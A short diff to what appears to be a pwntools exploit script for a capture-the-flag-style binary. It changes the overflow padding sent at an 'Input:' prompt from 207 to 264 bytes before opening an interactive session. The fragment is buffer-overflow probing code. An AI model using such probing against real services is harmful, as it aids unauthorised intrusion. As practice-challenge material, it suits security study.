@@ -30,7 +30,7 @@ def conn():
 
 def main():
     r = conn()
-    r.sendlineafter(b"Input:", b"a" * 207)
+    r.sendlineafter(b"Input:", b"a" * 264)
     r.interactive()
 
 
